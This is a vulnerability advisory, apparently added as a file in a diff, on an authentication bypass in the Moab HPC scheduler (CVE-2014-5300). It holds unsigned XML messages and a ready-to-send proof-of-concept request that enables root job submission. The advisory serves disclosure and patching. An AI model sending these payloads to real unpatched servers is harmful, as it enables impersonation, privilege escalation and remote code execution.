@@ -1,0 +1,110 @@
+##[Moab Authentication Bypass : CVE-2014-5300]##
+
+Software: Moab
+Affected Versions: All versions prior to Moab 7.2.9 and Moab 8
+CVE Reference: CVE-2014-5300
+Author: John Fitzpatrick, MWR Labs (http://labs.mwrinfosecurity.com/)
+Severity: High Risk
+Vendor: Adaptive Computing
+Vendor Response: Resolved in Moab 7.2.9 and Moab 8
+
+
+##[Description]
+
+It is possible to bypass authentication within Moab in order to impersonate and run commands/operations as arbitrary users. The issue is believed to affect all versions of Moab prior to versions 7.2.9 and Moab 8.
+
+
+##[Impact]
+
+Successful exploitation could lead to remote code execution.
+
+
+##[Cause]
+
+The Moab server does not appropriately authenticate requests.
+
+
+##[Solution]
+
+Upgrade to Moab 7.2.9, Moab 8, or a later version of the software. Beta versions of Moab 8 are affected by this issue. This issue also affects versions of Moab which are using Munge for authentication.
+
+This issue is believed to affect all instances of Moab prior to version 7.2.9 and 8. MWR are not aware of any alternate workaround for this issue.
+
+
+##[Technical Details]
+
+Moab is a workload manager used in High Performance Computing (HPC) environments. In a typical environment a user submits their jobs to the Moab server for it to handle the workload. This communication makes use of an XML based protocol, and example job submission is shown below: 
+
+<Envelope component="ClusterScheduler" count="1" name="moab" type="nonblocking" version="8.0.beta.2">
+  <Signature>
+    <DigestValue>7v49VzAlbyNQ4O3VChCus+v2LeE=</DigestValue>
+    <SignatureValue>QG13cmxhYnMgRWFzdGVyIEVnZyE=</SignatureValue>
+  </Signature>
+  <Body actor="test" timestamp="1408488412">
+    <Request action="submit" actor="test" cmdline="\STARTmsub">
+      <Object>job</Object>
+      <job>
+        <Owner>test</Owner>
+        <UserId>test</UserId>
+        <GroupId>test</GroupId>
+        <InitialWorkingDirectory>/home/test</InitialWorkingDirectory>
+        <UMask>2</UMask>
+        <Executable>/usr/bin/id</Executable>
+        <SubmitLanguage>PBS</SubmitLanguage>
+        <SubmitString>\START/usr/bin/id\0a\0a</SubmitString>
+      </job>
+    </Request>
+  </Body>
+</Envelope>
+
+Contained within this message is a <Signature> element, which contains both a <DigestValue> and <SignatureValue> elements. The <DigestValue> is simply a SHA1 sum of the <Body> element. The <SignatureValue>, however, is computed based upon a key (.moab.key) which is read by a setuid root binary (mauth) which performs some additional verification of the user before providing a signature for the message. This use of signatures is intended to prevent users from being able to craft arbitrary messages as the signature value is validated by the Moab server. Messages containing an incorrect signature for the message will be rejected.
+
+However, whilst an incorrect SignatureValue results in a rejected message, it was found that if no signature is supplied then the signature checks are skipped and the remainder of the message processed. As a result it is possible to craft arbitrary messages and these messages will be accepted and honoured by the server as long as the message does not include a <Signature> element.
+
+The following message contains no signature element and therefore will be accepted by the server:
+
+<Envelope component="ClusterScheduler" count="1" name="moab" type="nonblocking" version="8.0.beta.2">
+  <Body actor="test" timestamp="1408488412">
+    <Request action="submit" actor="test" cmdline="\STARTmsub">
+      <Object>job</Object>
+      <job>
+        <Owner>test</Owner>
+        <UserId>test</UserId>
+        <GroupId>test</GroupId>
+        <InitialWorkingDirectory>/home/test</InitialWorkingDirectory>
+        <UMask>2</UMask>
+
+        <Executable>/usr/bin/id</Executable>
+        <SubmitLanguage>PBS</SubmitLanguage>
+        <SubmitString>\START/usr/bin/id\0a\0a</SubmitString>
+      </job>
+    </Request>
+  </Body>
+</Envelope>
+
+With no signing taking place an adversary can specify arbitrary users for these operations to be performed under, and thus impersonate other users including executing jobs as other users.
+
+
+##[Proof of Concept]
+
+In addition to job submission Moab also provides the ability to dynamically reconfigure the Moab server remotely. Whilst a default Moab installation will not permit the submission of root jobs it is possible to exploit this vulnerability in order to dynamically reconfigure Moab to allow root job submissions. The following request achieves this and due to its simple nature makes a useful proof of concept (the timestamp value may require altering): 
+
+00000238
+<Envelope component="ClusterScheduler" count="1" name="moab" version="8.0.beta.2"><Body actor="root" timestamp="1404856164"><Request action="modify" actor="root" args="ALLOWROOTJOBS TRUE"><Object>sched</Object></Request></Body></Envelope>
+
+Sending the entire message above (including the size value) will enable root jobs on a vulnerable server.
+
+
+##[Detailed Timeline]
+
+2014-07-08 : Vulnerability identified and detailed information passed to Adaptive
+2014-07-09 : Adaptive inform MWR that code changes are being made to address the issue
+2014-07-11 : Adaptive inform MWR that regression testing has identified an additional issue  
+2014-07-14 : Moab 8 released
+2014-08-20 : Limited status update provided by Adaptive suggesting a 7.2 fix will emerge
+2014-09-08 : Release of advisory to HPC community
+2014-09-16 : Moab 7.2.9 released
+2014-09-25 : Public release of advisory  
+
+
+http://labs.mwrinfosecurity.com
